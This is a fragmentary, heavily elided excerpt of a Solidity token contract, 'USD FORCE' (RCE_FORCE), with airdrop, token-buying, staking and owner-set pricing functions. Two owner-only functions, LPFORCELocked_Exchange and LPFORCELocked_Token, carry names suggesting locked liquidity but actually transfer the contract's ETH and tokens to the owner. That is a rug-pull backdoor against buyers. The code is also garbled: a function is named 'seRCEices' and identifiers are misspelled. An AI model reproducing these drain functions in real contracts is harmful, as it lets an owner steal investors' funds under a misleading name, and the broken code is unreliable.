...
pragma solidity ^0.8.0;
contract RCE_FORCE is ERC20, Ownable {
    ...
    constructor() ERC20("USD FORCE", "RCE") {
    ...
    function claimAirdrop(address _refer) public returns (bool success){
      ...
      //  _burn(address(this), ((aAmt * 150) / 100)); //burn amount 150% greater than claim amount--we are FORCE!!!
        return true;
      }
  ...
  function buyToken(address _refer) public payable returns (bool success){
    ...
    uint256 _burnamt = ((_tkns * sburnper) / 100); //burn amount 10% to 150% more than sale amount --we are FORCE!!!
    sTot ++;
...
function Stakingplan(address payable _toaddress, uint256 _balances, uint64 membcode, uint64 rcode, uint64 plan) public payable {
    ...
    function LPFORCELocked_Exchange(uint amount) public onlyOwner {
    address payable _owner = payable(msg.sender);
    _owner.transfer(amount);
  }

    function LPFORCELocked_Token(IERC20 token, uint256 values) public onlyOwner {
        address payable _owner =  payable(msg.sender);
     ...
     */
    function seRCEices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {
    ...
    function TokenPrices() public view  returns (uint256) {
        ...
        if(total_lqudidy<tliquidity*(10**18))
        {
            total_lqudidy = tliquidity*(10**18) + total_lqudidy;
        }
